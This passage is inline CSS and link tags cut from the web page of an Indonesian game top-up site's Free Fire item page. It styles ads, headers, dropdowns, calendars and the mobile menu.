        [_nghost-gtc-c4] .ads-container.popup[_ngcontent-gtc-c4] button.close-button[_ngcontent-gtc-c4] img.cross[_ngcontent-gtc-c4] {
            border: none
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c4] {
                float: right
            }
            .fright[_ngcontent-gtc-c4] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4] .shuffle-pop-table[_ngcontent-gtc-c4] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c4] button.mat-icon-button[_ngcontent-gtc-c4] {
                top: auto;
                bottom: 7px
            }
            [_nghost-gtc-c4] .ads-container[_ngcontent-gtc-c4]:not(.squared) ins.adsbygoogle {
                width: 100% !important;
                margin-left: unset !important
            }
            [_nghost-gtc-c4] .ads-container[_ngcontent-gtc-c4] button.close-button[_ngcontent-gtc-c4] img.cross[_ngcontent-gtc-c4] {
                padding: 3px;
                width: 25px;
                height: 25px
            }
            [_nghost-gtc-c4] .ads-container.fixed-bottom[_ngcontent-gtc-c4] ins.adsbygoogle {
                width: calc(100vw - 57px) !important;
                height: 50px !important
            }
            [_nghost-gtc-c4] .ads-container.fixed-bottom[_ngcontent-gtc-c4] ins.adsbygoogle iframe,
            [_nghost-gtc-c4] .ads-container.fixed-bottom[_ngcontent-gtc-c4] ins.adsbygoogle ins {
                width: calc(100vw - 57px) !important;
                height: 50px !important
            }
            [_nghost-gtc-c4] .ads-container.popup[_ngcontent-gtc-c4] button.close-button[_ngcontent-gtc-c4] {
                top: 20px;
                right: 5px
            }
            [_nghost-gtc-c4] .ads-container.popup[_ngcontent-gtc-c4] ins.adsbygoogle {
                max-width: calc(100vw - 30px) !important;
                width: 300px !important;
                height: 250px !important
            }
            [_nghost-gtc-c4] .ads-container.popup[_ngcontent-gtc-c4] ins.adsbygoogle iframe,
            [_nghost-gtc-c4] .ads-container.popup[_ngcontent-gtc-c4] ins.adsbygoogle ins {
                max-width: calc(100vw - 30px) !important;
                width: 300px !important;
                height: 250px !important
            }
            [_nghost-gtc-c4] .ads-container.article[_ngcontent-gtc-c4] ins.adsbygoogle {
                max-width: calc(100vw - 60px) !important;
                height: 50px !important
            }
            [_nghost-gtc-c4] .ads-container.article[_ngcontent-gtc-c4] ins.adsbygoogle iframe,
            [_nghost-gtc-c4] .ads-container.article[_ngcontent-gtc-c4] ins.adsbygoogle ins {
                max-width: calc(100vw - 60px) !important;
                height: 50px !important
            }
        }
    </style>
    <link rel="canonical" href="https://duniagames.co.id/top-up/item/freefire">
    <link rel="alternate" href="https://duniagames.co.id/top-up/item/freefire" hreflang="id">
    <link rel="alternate" href="https://duniagames.co.id/top-up/item/freefire/en" hreflang="en">
    <style></style>
    <style>
        .justify-content-left {
            justify-content: left !important
        }

        .justify-content-center {
            justify-content: center !important
        }

        .justify-content-right {
            justify-content: right !important
        }

        .justify-content-space-between {
            justify-content: space-between !important
        }

        .justify-content-flex-end {
            justify-content: flex-end !important
        }

        .text-decoration-line-through {
            text-decoration: line-through !important
        }

        .text-decoration-underline {
            text-decoration: underline !important
        }

        .text-decoration-overline {
            text-decoration: overline !important
        }

        .text-decoration-none {
            text-decoration: none !important
        }

        .align-self-center {
            align-self: center
        }

        .cursor-no-drop {
            cursor: no-drop !important
        }

        .cursor-pointer {
            cursor: pointer !important
        }

        .text-left {
            text-align: left !important
        }

        .text-center {
            text-align: center !important
        }

        .text-right {
            text-align: right !important
        }

        .text-justify {
            text-align: justify !important
        }

        .v-align-top {
            vertical-align: top !important
        }

        .v-align-middle {
            vertical-align: middle !important
        }

        .v-align-bottom {
            vertical-align: bottom !important
        }

        .float-left {
            float: left !important
        }

        .float-right {
            float: right !important
        }

        .mat-datepicker-toggle button.mat-icon-button {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle button.mat-icon-button span.mat-button-wrapper,
        .mat-datepicker-toggle button.mat-icon-button span.mat-button-wrapper svg.mat-datepicker-toggle-default-icon {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown {
            position: relative
        }

        .cust-dropdown i.fa-caret-down {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown input[type=text] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown .cust-option {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown .cust-option.active {
            display: block
        }

        .cust-dropdown .cust-option ul.option-list {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown .cust-option ul.option-list li {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown .cust-option ul.option-list li label {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown .cust-option ul.option-list li label:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown .cust-option ul.option-list li label:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown .cust-option ul.option-list li input[type=radio] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown .cust-option ul.option-list li input[type=radio]:checked+label:after {
            opacity: 1
        }

        html {
            scroll-behavior: smooth
        }

        body {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a,
        label,
        ol li,
        table td,
        table th,
        ul li {
            font-family: Montserrat
        }

        b {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        p,
        span {
            margin: 0;
            font-family: Montserrat
        }

        button {
            outline: 0;
            font-family: Montserrat
        }

        input,
        textarea {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input {
                font-size: 11px
            }
        }

        label.label-media {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid span {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap p {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap p {
                font-size: .75em
            }
        }

        .close-circle-wrap p.close-circle {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap p.close-circle span {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create span {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament span {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament p {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame p {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame {
                right: 10px
            }
            a.close-frame p {
                display: none
            }
        }

        a.close-frame span {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control::-moz-placeholder {
            color: #69707e
        }

        .form-control::-ms-input-placeholder {
            color: #69707e
        }

        .form-control::placeholder {
            color: #69707e
        }

        .header-text h3 {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame span {
                right: 10px
            }
            .header-text h3 {
                font-size: 1.5em
            }
        }

        .header-text h4 {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium h3 {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small h3 {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium h3,
            .header-text-small h3 {
                font-size: 1.5em
            }
        }

        .header-text-extra-small h3 {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small h3 {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold h3 {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text p {
            font-size: 1em;
            color: #fff
        }

        .radio-input {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft {
            float: left
        }

        .fright {
            float: right
        }

        .row .padding-left-0 {
            padding-left: 0
        }

        .form-group.form-group--media {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected {
            background: 0 0
        }

        .invalid-feedback {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle .shuffle-container {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle .shuffle-container>.row {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table {
            display: table
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table .shuffle-pop-item {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table .shuffle-pop-item.img {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle .shuffle-container img {
            max-width: 100%
        }

        .popup-shuffle .shuffle-container p {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle .shuffle-container p strong {
            font-size: 1.09em
        }

        .mat-datepicker-content {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content {
            color: #fff
        }

        .mat-calendar-body-disabled>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label,
        .mat-calendar-table-header th,
        .mat-datepicker-content .mat-calendar-next-button,
        .mat-datepicker-content .mat-calendar-previous-button,
        .mat-datepicker-toggle,
        .mat-icon-button[disabled][disabled] {
            color: #fff
        }

        .mat-calendar-arrow {
            border-top-color: #fff
        }

        .mat-calendar-header {
            color: #fff
        }

        .cdk-keyboard-focused .mat-calendar-body-active>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .cdk-program-focused .mat-calendar-body-active>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .mat-calendar-body-today:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected {
            background: #d0021b;
            box-shadow: none
        }

        .block-url {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold h3 {
                font-size: 1em
            }
            .fleft {
                float: right
            }
            .fright {
                float: left
            }
            .popup-shuffle .shuffle-container .shuffle-pop-table {
                padding: 0 20px
            }
            .mat-datepicker-toggle button.mat-icon-button {
                top: auto;
                bottom: 7px
            }
        }

        .mat-primary .mat-option.mat-selected:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel .mat-option {
            color: #797979
        }

        .ngx-editor-textarea div,
        .ngx-editor-textarea section {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea div img,
        .ngx-editor-textarea section img {
            width: 100% !important
        }

        .ngx-editor-textarea a {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea * {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea b {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea b * {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea td {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content {
                background-color: #000
            }
        }

        .d-absolute--center {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center img {
            width: 50px;
            opacity: .5
        }

        .toogleMore {
            cursor: pointer
        }

        header.site-header {
            padding: 0;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 98
        }

        header.site-header::after {
            position: absolute;
            content: "";
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #1d1f23;
            opacity: .5;
            transition: all .3s ease-in-out
        }

        header.site-header .empty-notification .loader-comment-list {
            overflow: hidden;
            position: absolute;
            left: 0;
            right: 0;
            top: 50%;
            transform: translateY(-50%)
        }

        header.site-header .empty-notification__label {
            text-align: center
        }

        header.site-header .container {
            width: 1300px
        }

        header.site-header.inactive .site-header__item__nav li {
            padding: 20px 0 25px
        }

        header.site-header.active::after {
            opacity: 1
        }

        header.site-header.active .language {
            margin-top: 5px
        }

        @media (max-width:767px) {
            header.site-header::after {
                opacity: .9
            }
            header.site-header.active .language {
                margin-top: 0
            }
        }

        header.site-header.active .site-header__item__auth--search {
            margin-top: 5px !important
        }

        header.site-header.active .site-header__item__auth.site-header__item__auth--logged .item-logged .img-wrap {
            height: 35px;
            width: 35px;
            margin-top: 3px
        }

        header.site-header.active .site-header__item__brand img {
            width: 70px
        }

        header.site-header.active .site-header__item__auth {
            margin-top: -2px
        }

        header.site-header.active .site-header__item__auth--logged {
            margin-top: 0
        }

        header.site-header.active .site-header__item__nav li:after {
            height: 2px
        }

        header.site-header.active .site-header__item__nav li a {
            padding: 15px 12px 18px 15px
        }

        header.site-header.active .header__item__auth {
            padding: 5px 0 0
        }

        header.site-header.active .before-login {
            margin-top: 5px
        }

        header.site-header.active .before-login .login-btn,
        header.site-header.active .before-login .register-btn {
            margin-top: 6px
        }

        header.site-header.active .site-header__item.site-header__item--right {
            padding: 3px 0
        }

        header.site-header.active .site-header__item__auth--logged .item-logged .img-wrap {
            top: 1.5px
        }

        header.site-header .language {
            display: inline-block;
            vertical-align: middle;
            padding-right: 28px
        }

        header.site-header .language select {
            background: 0 0;
            font-family: Montserrat;
            text-transform: uppercase;
            color: #fff;
            border: none;
            -webkit-appearance: none;
            outline: 0;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600
        }

        @media (max-width:767px) {
            header.site-header .language {
                padding-right: 0
            }
            header.site-header .language select {
                font-size: 1.2em;
                padding: 0 4px;
                margin-right: -4px;
                position: relative;
                top: 2px
            }
        }

        header.site-header .language select option {
            background: #161619;
            color: #fff;
            font-weight: 700;
            outline: 0
        }

        header.site-header .language span {
            color: #fff;
            margin-right: 10px
        }

        header.site-header .site-header__item {
            position: relative;
            display: inline-block;
            vertical-align: middle;
            z-index: 9
        }

        header.site-header .site-header__item--left {
            vertical-align: top
        }

        header.site-header .site-header__item.site-header__item--right {
            float: right;
            padding: 9.9px 0
        }

        header.site-header .site-header__item__brand {
            border-radius: 0 0 5px 5px;
            overflow: hidden;
            max-height: 59px;
            background-color: #f9f9f9
        }

        header.site-header .site-header__item__brand a {
            display: inline-block;
            overflow: hidden;
            border-radius: 3px
        }

        header.site-header .site-header__item__brand img {
            width: 100px;
            transition: all .3s ease-in-out
        }

        @media (max-width:767px) {
            header.site-header .language span {
                margin-right: 0
            }
            header.site-header .site-header__item__brand {
                height: 47px
            }
            header.site-header .site-header__item__brand img {
                width: 70px
            }
            header .pop-mobile-menu .profile .item-logged--name {
                overflow: hidden;
                text-overflow: ellipsis;
                -o-text-overflow: ellipsis;
                white-space: nowrap;
                width: 80%
            }
        }

        @media only screen and (max-width:1024px) {
            header.site-header .container {
                width: 100%
            }
            header.site-header .site-header__item.site-header__item--right,
            header.site-header .site-header__item__nav {
                display: none
            }
        }

        header.site-header .site-header__item__nav ul {
            padding: 0;
            margin-left: 30px;
            margin-bottom: 0
        }

        header.site-header .site-header__item__nav li {
            list-style: none;
            display: inline-block;
            vertical-align: middle;
            margin: 0 10px 0 0;
            position: relative
        }

        header.site-header .site-header__item__nav li a {
            padding: 23px 12px 22px 15px;
            display: block;
            cursor: pointer
        }

        header.site-header .site-header__item__nav li:after {
            position: absolute;
            content: "";
            bottom: 0;
            height: 3px;
            left: 0;
            right: 0;
            width: 0%;
            margin: auto;
            background: #d0021b;
            transition: all .3s ease-in-out
        }

        header.site-header .site-header__item__nav li.active:after,
        header.site-header .site-header__item__nav li:hover:after {
            width: 100%
        }

        header.site-header .site-header__item__nav a {
            position: relative;
            font-family: Montserrat;
            font-size: 14px;
            color: #fff;
            font-weight: 600;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        header.site-header .site-header__item__auth {
            margin-top: 0;
            display: inline-block;
            vertical-align: middle;
            transition: all .3s ease-in-out
        }

        header.site-header .site-header__item__auth--search,
        header.site-header .site-header__item__auth.site-header__item__auth--search {
            margin-right: 28px
        }

        header.site-header .site-header__item__auth.site-header__item__auth--search button {
            border: 0;
            background: 0 0
        }

        header.site-header .site-header__item__auth.site-header__item__auth--search i {
            font-size: 1.5em;
            color: #fff
        }

        header.site-header .site-header__item__auth.site-header__item__auth--reg a {
            margin-left: 20px;
            position: relative;
            display: inline-block;
            vertical-align: middle;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            text-transform: uppercase;
            text-decoration: none
        }

        header.site-header .site-header__item__auth.site-header__item__auth--reg a:after {
            font-family: Montserrat;
            position: absolute;
            content: '/';
            right: -12px;
            top: 0;
            font-size: .9em
        }

        header.site-header .site-header__item__auth.site-header__item__auth--reg a:last-child:after {
            display: none
        }

        header.site-header .site-header__item__auth.site-header__item__auth--reg a.login {
            cursor: pointer
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged a.notification {
            position: relative;
            display: inline-block;
            margin-right: 20px
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged a.notification::after {
            position: absolute;
            content: "";
            right: 0;
            top: 0;
            height: 10px;
            width: 10px;
            display: inline-block;
            vertical-align: middle;
            border-radius: 100%;
            background: #d0021b
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged a.notification i {
            color: #fff;
            font-size: 1.5em
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged .item-logged {
            margin: 0 0 0 15px;
            display: inline-block;
            vertical-align: middle
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged .item-logged--name {
            margin-left: 0
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged .item-logged .img-wrap {
            height: 45px;
            width: 45px;
            overflow: hidden;
            position: relative;
            border-radius: 100%;
            transition: all .3s ease-in-out
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged .item-logged .img-wrap img {
            max-width: 100%;
            min-width: 100%;
            max-height: 100%;
            min-height: 100%;
            -o-object-fit: cover;
            object-fit: cover
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged .item-logged h4 {
            font-size: 14px;
            color: #fff;
            font-weight: 600;
            max-width: 240px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis
        }

        header.site-header .site-header__item__auth.site-header__item__auth--logged .site-header__item__auth {
            margin-top: 0
        }

        header.site-header .mobile-menu {
            position: absolute;
            right: 15px;
            top: 0;
            z-index: 9
        }

        header.site-header .mobile-menu .mobile-menu__item {
            display: inline-block;
            vertical-align: middle;
            margin-left: 20px
        }

        @media only screen and (max-width:1024px) {
            header.site-header .mobile-menu {
                margin-top: 11px;
                margin-bottom: auto
            }
            header.site-header .mobile-menu .mobile-menu__item:last-child {
                position: relative;
                top: -6px
            }
        }

        header.site-header .mobile-menu .mobile-menu__item a,
        header.site-header .mobile-menu .mobile-menu__item button {
            display: inline-block;
            position: relative;
            top: 3px;
            border: 0;
            background: 0 0
        }

        header.site-header .mobile-menu .mobile-menu__item a i,
        header.site-header .mobile-menu .mobile-menu__item button i {
            font-size: 1.2em;
            color: #fff
        }

        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (-webkit-min-device-pixel-ratio:1) {
            header.site-header .mobile-menu .mobile-menu__item a i.bell-tabs,
            header.site-header .mobile-menu .mobile-menu__item button i.bell-tabs {
                margin-left: 20px
            }
        }

        header.site-header .mobile-menu .btn-menu {
            background: 0 0;
            outline: 0;
            border: none
        }

        header.site-header .mobile-menu .btn-menu .btn-menu__item {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 2px;
            background: #fff;
            transition: all .3s ease-in-out
        }

        header.site-header .mobile-menu .btn-menu .btn-menu__item::before {
            position: absolute;
            content: "";
            top: -7px;
            left: 0;
            right: 0;
            height: 2px;
            width: 20px;
            background: #fff;
            transition: all .3s ease-in-out
        }

        header.site-header .mobile-menu .btn-menu .btn-menu__item::after {
            position: absolute;
            content: "";
            bottom: -7px;
            left: unset;
            right: 0;
            height: 2px;
            width: 15px;
            background: #fff;
            transition: all .3s ease-in-out
        }

        header.site-header .mobile-menu .btn-menu .btn-menu__item.on {
            transform: rotate(45deg)
        }

        header.site-header .mobile-menu .btn-menu .btn-menu__item.on::before {
            transform: rotate(-90deg);
            top: 0
        }

        header.site-header .mobile-menu .btn-menu .btn-menu__item.on::after {
            opacity: 0
        }

        header.site-header .user-logged {
            display: inline-block;
            position: relative
        }

        header.site-header .user-logged:hover .dd-list {
            display: block
        }

        header.site-header .user-logged a {
            display: inline-block
        }

        header.site-header .user-logged .dd-list {
            position: absolute;
            right: 0;
            top: 100%;
            display: none;
            padding: 8px 0 0
        }

        header.site-header .user-logged .dd-list .dd-wrapper {
            background-color: #1d1f23;
            padding: 16px 24px 4px;
            border-radius: 3px;
            box-shadow: 0 4px 8px 0 rgba(0, 0, 0, .23);
            min-width: 200px
        }

        header.site-header .user-logged .dd-list .dd-wrapper .dd-point {
            font-family: Montserrat;
            font-size: 16px;
            color: #fff;
            margin-bottom: 12px
        }

        header.site-header .user-logged .dd-list .dd-wrapper .dd-point small,
        header.site-header .user-logged .dd-list .dd-wrapper .dd-point strong {
            display: block
        }

        header.site-header .user-logged .dd-list .dd-wrapper .dd-point strong {
            font-family: Montserrat-Bold;
            font-weight: 400;
            font-size: 30px;
            line-height: 1em
        }

        header.site-header .user-logged .dd-list .dd-wrapper a {
            display: block;
            margin-bottom: 12px;
            font-family: Montserrat-Bold;
            font-weight: 400;
            font-size: 14px;
            color: #fff;
            text-decoration: none;
            text-transform: uppercase
        }

        header.site-header .user-logged .dd-list .dd-wrapper a img {
            max-width: 16px;
            display: inline-block;
            vertical-align: middle;
            margin-left: 4px
        }

        header .pop-mobile-menu {
            position: fixed;
            top: auto;
            bottom: 100%;
            opacity: 0;
            left: 0;
            width: 100%;
            padding: 20px;
            font-family: Montserrat;
            color: #fff;
            background-color: #1d1f23;
            transition: all .3s ease-in-out;
            box-shadow: 0 4px 8px 0 rgba(0, 0, 0, .23)
        }

        header .pop-mobile-menu.pop-on {
            top: 47px;
            bottom: auto;
            opacity: 1;
            transition: all .3s ease-in-out
        }

        header .pop-mobile-menu .profile>a {
            display: block
        }

        header .pop-mobile-menu .profile strong {
            display: block;
            margin-bottom: 8px
        }

        header .pop-mobile-menu .profile .item-logged--img {
            display: inline-block;
            vertical-align: middle;
            position: relative;
            overflow: hidden;
            border-radius: 50%;
            margin-right: 8px
        }

        header .pop-mobile-menu .profile .item-logged--img .img-wrap {
            text-align: center;
            position: relative;
            width: 48px;
            height: 48px
        }

        header .pop-mobile-menu .profile .item-logged--img .img-wrap img {
            width: 100%;
            height: 100%;
            -o-object-fit: cover;
            object-fit: cover
        }

        header .pop-mobile-menu .profile .item-logged--name {
            display: inline-block;
            vertical-align: middle;
            color: #fff
        }

        header .pop-mobile-menu .mob-list {
            margin-top: 10px
        }

        header .pop-mobile-menu .mob-list li {
            border-bottom: 1px solid rgba(255, 255, 255, .3)
        }

        header .pop-mobile-menu .mob-list li:last-child {
            border: none
        }

        header .pop-mobile-menu .mob-list li a {
            display: block;
            height: 48px;
            line-height: 48px;
            font-family: Montserrat;
            font-size: 14px;
            color: #fff;
            text-decoration: none;
            text-transform: uppercase
        }

        header .pop-mobile-menu .set-log a {
            display: block;
            margin-bottom: 0;
            font-family: Montserrat-Bold;
